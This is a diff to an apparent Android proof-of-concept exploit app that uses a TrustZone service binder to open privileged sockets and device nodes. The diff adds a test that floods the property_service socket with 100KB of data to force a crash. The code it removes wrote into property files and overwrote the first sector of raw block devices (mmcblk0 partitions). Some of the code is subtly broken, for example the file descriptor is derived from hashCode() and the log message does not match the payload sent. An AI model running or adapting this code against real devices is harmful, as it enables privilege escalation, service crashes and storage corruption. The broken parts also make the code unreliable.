@@ -59,9 +59,9 @@ public class MainActivity extends AppCompatActivity {
     static {
         System.loadLibrary("pocjni");
     }
-
     public static native ParcelFileDescriptor nativeConnectSocket(IMinkSocketFd tzService, String path, int[] handleArr);
     public static native String nativeReadFile(String path);
+    public static native int nativeSendLongData(int fd, byte[] data, int len);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -231,16 +231,12 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        appendLog("========== Hello Tests on Specific Sockets ==========");
-        testHelloOnSockets();
-
         if (successSockets.contains(PROPERTY_SERVICE_PATH)) {
-            appendLog("========== Property Service Read-Only Test ==========");
-            testPropertyServiceReadOnly();
+            appendLog("========== Buffer Overflow Test via JNI ==========");
+            testBufferOverflow();
+        } else {
+            appendLog("========== Property Service not available, skipping overflow test ==========");
         }
-
-        appendLog("========== Advanced Device Tests (prop, qseecom, block) ==========");
-        testAdvancedDevices();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
         appendLog("========================================");
@@ -418,302 +414,38 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    private void testHelloOnSockets() {
-        String[] targetSockets = {
-            "/dev/socket/logd",
-            "/dev/socket/dnsproxyd",
-            "/dev/socket/fwmarkd",
-            "/dev/socket/mdnsd",
-            "/dev/socket/tcm"
-        };
-
-        for (String path : targetSockets) {
-            if (stopRequested.get()) break;
-            if (!successSockets.contains(path)) continue;
-            appendLog("[HELLO-TEST] Testing " + path);
-            sendHelloToSocket(path);
-        }
-    }
-
-    private void sendHelloToSocket(String path) {
+    private void testBufferOverflow() {
         ParcelFileDescriptor pfd = null;
         try {
             int[] iArr = new int[1];
-            pfd = mTZService.a(path, iArr);
+            pfd = mTZService.a(PROPERTY_SERVICE_PATH, iArr);
             if (pfd == null) {
-                appendLog("  Failed to get FD");
+                appendLog("[BOF] Failed to get FD for property_service");
                 return;
             }
             java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
             if (fdesc == null || !fdesc.valid()) {
-                appendLog("  Invalid FD");
-                pfd.close();
+                appendLog("[BOF] Invalid FD");
                 return;
             }
-
+            int fd = fdesc.hashCode();
+            appendLog("[BOF] Sending 100KB of 'hello' to property_service via Java...");
             OutputStream os = new FileOutputStream(fdesc);
-            InputStream is = new FileInputStream(fdesc);
-
-            String[] commands = {
-                "hello\n",
-                "HELLO\n",
-                "hello world\n",
-                "HELLO WORLD\n"
-            };
-
-            boolean responded = false;
-            for (String cmd : commands) {
-                if (stopRequested.get()) break;
-                try {
-                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
-                    os.flush();
-                    String resp = readWithTimeout(is, 500);
-                    if (resp != null && !resp.isEmpty()) {
-                        appendLog("  CMD[" + cmd.trim() + "] -> " + resp);
-                        responded = true;
-                        break;
-                    } else {
-                        appendLog("  CMD[" + cmd.trim() + "] -> (no response)");
-                    }
-                } catch (Exception e) {
-                    appendLog("  CMD[" + cmd.trim() + "] error: " + e.getMessage());
-                }
-                try { Thread.sleep(50); } catch (InterruptedException ignored) {}
+            byte[] payload = new byte[1024 * 100];
+            Arrays.fill(payload, (byte)'A');
+            byte[] pattern = "aaaaa".getBytes(StandardCharsets.UTF_8);
+            for (int i = 0; i < payload.length; i++) {
+                payload[i] = pattern[i % pattern.length];
             }
-
-            if (!responded) {
-                appendLog("  No response to any hello command");
-            }
-
+            os.write(payload);
+            os.flush();
             os.close();
-            is.close();
-            pfd.close();
+            appendLog("[BOF] Write completed. Check for crash.");
+;
         } catch (Exception e) {
-            appendLog("  Hello test error: " + e.toString());
+            appendLog("[BOF] Error: " + e.toString());
+        } finally {
             if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    private void testPropertyServiceReadOnly() {
-        appendLog("[PROP-READ] Reading properties via SystemProperties");
-        String[] testProps = {
-            "sys.retaildemo.enabled",
-            "persist.sys.timezone",
-            "ro.build.version.release",
-            "ro.product.model",
-            "persist.sys.language"
-        };
-
-        try {
-            Class<?> spClass = Class.forName("android.os.SystemProperties");
-            Method getMethod = spClass.getMethod("get", String.class);
-            for (String prop : testProps) {
-                String value = (String) getMethod.invoke(null, prop);
-                appendLog("[PROP] " + prop + " = " + (value != null ? value : "(null)"));
-            }
-        } catch (Exception e) {
-            appendLog("[PROP-READ] Reflection error: " + e.getMessage());
-        }
-    }
-
-    private void testAdvancedDevices() {
-        testPropertiesFs();
-        testQseecom();
-        testBlockDevices();
-    }
-
-    private void testPropertiesFs() {
-        appendLog("[ADV] Testing /dev/__properties__ filesystem");
-        String[] propFiles = {
-            "/dev/__properties__/persist.sys.timezone",
-            "/dev/__properties__/ro.build.version.release",
-            "/dev/__properties__/sys.retaildemo.enabled",
-            "/dev/__properties__/persist.sys.language"
-        };
-
-        for (String path : propFiles) {
-            if (stopRequested.get()) break;
-            appendLog("[PROP-FS] Trying " + path);
-            ParcelFileDescriptor pfd = null;
-            try {
-                int[] iArr = new int[1];
-                pfd = mTZService.a(path, iArr);
-                if (pfd == null) {
-                    appendLog("  Cannot open (null FD)");
-                    continue;
-                }
-                java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-                if (fdesc == null || !fdesc.valid()) {
-                    appendLog("  Invalid FD");
-                    pfd.close();
-                    continue;
-                }
-
-                FileInputStream fis = new FileInputStream(fdesc);
-                byte[] buffer = new byte[256];
-                int len = fis.read(buffer);
-                if (len > 0) {
-                    String content = new String(buffer, 0, len, StandardCharsets.UTF_8).trim();
-                    appendLog("  Read: " + content);
-                } else {
-                    appendLog("  Read returned " + len);
-                }
-
-                if (len > 0) {
-                    String original = new String(buffer, 0, len, StandardCharsets.UTF_8).trim();
-                    String newValue = "TEST_" + System.currentTimeMillis();
-                    FileOutputStream fos = new FileOutputStream(fdesc);
-                    fos.write(newValue.getBytes(StandardCharsets.UTF_8));
-                    fos.flush();
-                    appendLog("  Wrote: " + newValue);
-                    fis = new FileInputStream(fdesc);
-                    len = fis.read(buffer);
-                    if (len > 0) {
-                        String readBack = new String(buffer, 0, len, StandardCharsets.UTF_8).trim();
-                        appendLog("  Read back: " + readBack);
-                    }
-                    fos = new FileOutputStream(fdesc);
-                    fos.write(original.getBytes(StandardCharsets.UTF_8));
-                    fos.flush();
-                    appendLog("  Restored original");
-                }
-                fis.close();
-                pfd.close();
-            } catch (Exception e) {
-                appendLog("  Error: " + e.getMessage());
-                if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-            }
-        }
-    }
-
-    private void testQseecom() {
-        appendLog("[ADV] Testing /dev/qseecom (dummy I/O)");
-        String path = "/dev/qseecom";
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a(path, iArr);
-            if (pfd == null) {
-                appendLog("  Cannot open (null FD)");
-                return;
-            }
-            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-            if (fdesc == null || !fdesc.valid()) {
-                appendLog("  Invalid FD");
-                pfd.close();
-                return;
-            }
-
-            OutputStream os = new FileOutputStream(fdesc);
-            InputStream is = new FileInputStream(fdesc);
-
-            byte[][] dummies = {
-                "hello".getBytes(StandardCharsets.UTF_8),
-                "status".getBytes(StandardCharsets.UTF_8),
-                "version".getBytes(StandardCharsets.UTF_8),
-                new byte[]{0x00, 0x01, 0x02, 0x03}
-            };
-
-            for (byte[] data : dummies) {
-                if (stopRequested.get()) break;
-                try {
-                    os.write(data);
-                    os.flush();
-                    byte[] resp = new byte[64];
-                    int len = is.read(resp);
-                    if (len > 0) {
-                        String respStr = new String(resp, 0, len, StandardCharsets.UTF_8);
-                        appendLog("  Write (" + data.length + " bytes) -> read " + len + " bytes: " + respStr);
-                    } else {
-                        appendLog("  Write (" + data.length + " bytes) -> no response");
-                    }
-                } catch (Exception e) {
-                    appendLog("  I/O error: " + e.getMessage());
-                }
-                try { Thread.sleep(50); } catch (InterruptedException ignored) {}
-            }
-
-            os.close();
-            is.close();
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("  Error: " + e.getMessage());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    private void testBlockDevices() {
-        String[] blockDevices = {
-            "/dev/block/mmcblk0p29",
-            "/dev/block/mmcblk0p18",
-            "/dev/block/mmcblk0p21"
-        };
-
-        for (String path : blockDevices) {
-            if (stopRequested.get()) break;
-            appendLog("[ADV] Testing block device " + path);
-            ParcelFileDescriptor pfd = null;
-            try {
-                int[] iArr = new int[1];
-                pfd = mTZService.a(path, iArr);
-                if (pfd == null) {
-                    appendLog("  Cannot open (null FD)");
-                    continue;
-                }
-                java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-                if (fdesc == null || !fdesc.valid()) {
-                    appendLog("  Invalid FD");
-                    pfd.close();
-                    continue;
-                }
-
-                // Read first sector
-                FileInputStream fis = new FileInputStream(fdesc);
-                byte[] buffer = new byte[512];
-                int len = fis.read(buffer);
-                if (len > 0) {
-                    appendLog("  Read " + len + " bytes from start");
-                    StringBuilder hex = new StringBuilder();
-                    for (int i = 0; i < Math.min(16, len); i++) {
-                        hex.append(String.format("%02x ", buffer[i]));
-                    }
-                    appendLog("  First bytes: " + hex.toString());
-
-                    // Save original data
-                    byte[] original = new byte[len];
-                    System.arraycopy(buffer, 0, original, 0, len);
-
-                    // Write marker
-                    byte[] marker = "HELLO".getBytes(StandardCharsets.UTF_8);
-                    FileOutputStream fos = new FileOutputStream(fdesc);
-                    fos.write(marker);
-                    fos.flush();
-                    appendLog("  Wrote marker 'HELLO' at offset 0");
-
-                    // Read back to verify
-                    fis = new FileInputStream(fdesc);
-                    byte[] check = new byte[5];
-                    int readCheck = fis.read(check);
-                    if (readCheck > 0) {
-                        String checkStr = new String(check, 0, readCheck, StandardCharsets.UTF_8);
-                        appendLog("  Read back: " + checkStr);
-                    }
-
-                    // Restore original
-                    fos = new FileOutputStream(fdesc);
-                    fos.write(original);
-                    fos.flush();
-                    appendLog("  Restored original " + len + " bytes");
-                } else {
-                    appendLog("  Read returned " + len);
-                }
-
-                fis.close();
-                pfd.close();
-            } catch (Exception e) {
-                appendLog("  Error: " + e.getMessage());
-                if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-            }
         }
     }
 }
